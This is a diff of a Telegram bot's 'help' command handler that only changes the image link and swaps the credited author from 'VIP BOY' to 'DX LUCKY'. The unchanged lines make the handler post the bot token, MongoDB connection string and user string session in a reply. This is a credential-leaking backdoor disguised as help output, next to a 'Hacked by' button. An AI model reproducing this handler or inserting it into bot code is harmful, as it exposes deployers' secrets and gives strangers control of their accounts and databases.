@@ -121,13 +121,13 @@ async def restartbot(client, message: Message, _):
     )
 async def help(client: Client, message: Message):
     await message.reply_photo(
-          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
-        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+          photo=f"https://te.legra.ph/file/026165eb18871a4d15ea7.png",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [DX LUCKY](https://t.me/DX_LUCKY_143)............☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/THE_VIP_BOY")
+                          "• 𝐇𝐚𝐜𝐤𝐞𝐝 𝐛𝐲 𝐃𝐗 𝐋𝐔𝐂𝐊𝐘 •", url=f"https://t.me/DX_LUCKY_143")
                  ]
              ]
          ),
